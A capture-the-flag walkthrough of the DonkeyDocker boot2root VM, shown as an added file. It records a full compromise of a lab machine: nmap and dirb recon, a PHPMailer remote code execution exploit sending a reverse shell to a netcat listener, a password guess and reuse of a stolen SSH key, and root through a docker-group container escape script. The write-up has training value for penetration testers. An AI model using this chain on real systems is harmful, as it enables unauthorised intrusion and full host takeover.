@@ -1,0 +1,158 @@
+Recon Phase:
+
+$ nmap -T4 -A -v 172.16.34.164
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
+    | ssh-hostkey:
+    |   2048 9c:38:ce:11:9c:b2:7a:48:58:c9:76:d5:b8:bd:bd:57 (RSA)
+    |_  256 d7:5e:f2:17:bd:18:1b:9c:8c:ab:11:09:e8:a0:00:c2 (ECDSA)
+    80/tcp open  http    Apache httpd 2.4.10 ((Debian))
+    | http-methods:
+    |_  Supported Methods: GET HEAD POST OPTIONS
+    | http-robots.txt: 3 disallowed entries
+    |_/contact.php /index.php /about.php
+    |_http-server-header: Apache/2.4.10 (Debian)
+    |_http-title: Docker Donkey
+$ dirb http://172.16.34.164/
+    http://172.16.34.164/mailer/examples/
+it's PHPMailer https://github.com/PHPMailer/PHPMailer , so from github should be VERSION
+    http://172.16.34.164/mailer/VERSION --> 5.2.16
+================================================================================
+Attacking Phase:
+$ searchsploit phpmailer
+I used this exploit "PHPMailer < 5.2.18 - Remote Code Execution (Python)"
+https://www.exploit-db.com/exploits/40974/
+$ nano /usr/share/exploitdb/platforms/php/webapps/40974.py
+Edit target to 172.16.34.164/contact and reverse shell to 172.16.34.1 Then i started listen on port 4444
+$ nc -lp 4444
+$ python 40974.py Then activate the shell 172.16.34.164/backdoor.php
+Then i got a shell and i'm inside a container !!
+$ python -c 'import pty; pty.spawn("/bin/sh")'
+$ cat /main.sh
+    #!/bin/bash
+
+    # change permission
+    chown smith:users /home/smith/flag.txt
+
+    # Start apache
+    source /etc/apache2/envvars
+    a2enmod rewrite
+    apachectl -f /etc/apache2/apache2.conf
+
+    sleep 3
+    tail -f /var/log/apache2/*&
+
+    # Start our fake smtp server
+    python -m smtpd -n -c DebuggingServer localhost:25
+then i tried user smith with password smith
+$ su smith
+$ id
+    uid=1000(smith) gid=100(users) groups=100(users)
+$ cat /home/smith/flag.txt
+    This is not the end, sorry dude. Look deeper!
+    I know nobody created a user into a docker
+    container but who cares? ;-)
+
+    But good work!
+    Here a flag for you: flag0{9fe3ed7d67635868567e290c6a490f8e}
+
+    PS: I like 1984 written by George ORWELL
+inside .ssh there is a key
+$ cat id_ed25519.pub
+    ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICEBBzcffpLILgXqY77+z7/Awsovz/
+    jkhOd/0fDjvEof orwell@donkeydocker
+and the same public key is authorized with username orwell
+$ cat authorized_keys
+    ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICEBBzcffpLILgXqY77+z7/Awsovz/
+    jkhOd/0fDjvEof orwell@donkeydocker
+Then i copied both the public and the private key to my local machine
+$ ssh -i id_key orwell@172.16.34.164
+    Welcome to
+
+      ___           _            ___          _
+     |   \ ___ _ _ | |_____ _  _|   \ ___  __| |_____ _ _
+     | |) / _ \ ' \| / / -_) || | |) / _ \/ _| / / -_) '_|
+     |___/\___/_||_|_\_\___|\_, |___/\___/\__|_\_\___|_|
+                            |__/
+                                 Made with <3 v.1.0 - 2017
+
+    This is my first boot2root - CTF VM. I hope you enjoy it.
+    if you run into any issue you can find me on Twitter: @dhn_
+    or feel free to write me a mail to:
+
+     - Email: dhn@zer0-day.pw
+     - GPG key: 0x2641123C
+     - GPG fingerprint: 4E3444A11BB780F84B58E8ABA8DD99472641123C
+
+    Level:       I think the level of this boot2root challange
+                 is hard or intermediate.
+
+    Try harder!: If you are confused or frustrated don't forget
+                 that enumeration is the key!
+
+    Thanks:      Special thanks to @1nternaut for the awesome
+                 CTF VM name!
+
+    Feedback:    This is my first boot2root - CTF VM, please
+                 give me feedback on how to improve!
+
+    Looking forward to the write-ups!
+
+    donkeydocker:~$
+i'm inside the host
+$ cat flag.txt
+    You tried harder! Good work ;-)
+
+    Here a flag for your effort: flag01{e20523853d6733721071c2a4e95c9c60}
+================================================================================
+Privilege Escalation:
+
+$ id
+    uid=1000(orwell) gid=1000(orwell) groups=101(docker),1000(orwell)
+Since orwell is in docker group ,i took the idea from Chris Foster
+https://fosterelli.co/privilege-escalation-via-docker.html
+is to mount / of the host inside a container
+i created two files
+Dockerfile
+
+    FROM ubuntu:14.04
+    COPY exploit.sh /exploit.sh
+    CMD ["/bin/bash", "exploit.sh"]
+and exploit.sh "i edited the file"
+
+    if [ ! -d "/hostOS" ]; then
+      echo
+      echo ==== ERROR ====
+      echo It looks like /hostOS does not exist
+      echo Please run this docker image with a /hostOS volume mounted to /
+      echo For example: docker run -v /:/hostOS -i -t exploitapp
+      echo
+      exit
+    fi
+
+    if [ ! -e "/bin/bash" ]; then
+      echo
+      echo ==== ERROR ====
+      echo It looks like /hostOS does not contain a root filesystem
+      echo Please run this docker image with a /hostOS volume mounted to /
+      echo For example: docker run -v /:/hostOS -i -t exploitapp
+      echo
+      exit
+    fi
+
+    echo
+    echo You should now have a root shell on the host OS
+    echo Press Ctrl-D to exit the docker instance / shell
+    chroot /hostOS
+    /bin/sh
+$ docker build -t rootplease .
+$ docker run -v /:/hostOS -i -t rootplease
+$ cat /root/flag.txt
+    YES!! You did it :-). Congratulations!
+
+    I hope you enjoyed this CTF VM.
+
+    Drop me a line on twitter @dhn_, or via email dhn@zer0-day.pw
+
+    Here is your flag: flag2{60d14feef575bacf5fd8eb06ec7cd8e7}
+================================================================================
